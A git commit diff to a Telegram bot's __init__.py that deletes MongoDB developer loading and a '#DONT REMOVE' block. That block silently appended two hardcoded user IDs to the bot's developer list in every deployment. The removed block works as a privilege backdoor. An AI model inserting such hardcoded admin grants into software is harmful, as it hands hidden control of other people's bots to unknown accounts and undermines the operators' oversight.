ec63fec408ea263754777022895935072c691dc0
Anshul Garg <garganshul553@gmail.com>
2022-07-01 15:07:13 +0530

    Update __init__.py

--- Asura/__init__.py
+++ Asura/__init__.py
@@ -1,6 +1,4 @@
 from pyrogram import Client, filters
-import asyncio
-from motor.motor_asyncio import AsyncIOMotorClient as MongoClient
 from os import getenv
 from dotenv import load_dotenv
 
@@ -11,13 +9,7 @@ API_HASH = getenv("API_HASH")
 TOKEN = getenv("TOKEN")
 MONGO_URI = getenv("MONGO_URI")
 PREFIXES = ['!', '/', '.']
-DEVS = list(map(int, getenv("DEVS").split()))
-#DONT REMOVE
-for user in [1906005317, 5365575465]:
-  if user in DEVS:
-    pass
-  else:
-    DEVS.append(user)
+
 
 
 asura = Client(
@@ -37,32 +29,5 @@ BOT_ID = x.id
 
 
 
-mongo_client = MongoClient(MONGO_URI)
-db = mongo_client.asura
-devsdb = db.devs
-
-
-
 def get_command(com):
   return filters.command([com, f"{com}@{BOT_USERNAME}"], prefixes=PREFIXES)
-
-
-loop = asyncio.get_event_loop()
-
-async def load_devs():
-  global DEVS
-  devs = []
-  async for dev in devsdb.find({"dev_id": {"$gt": 0}}):
-    devs.append(dev)
-  for dev in DEVS:
-    if dev in devs:
-      pass
-    else:
-      await devsdb.delete_one({"dev_id": dev})
-  devs = []
-  async for dev in devsdb.find({"dev_id": {"$gt": 0}}):
-    devs.append(dev)
-  DEVS = devs
-
-
-loop.run_until_complete(load_devs())
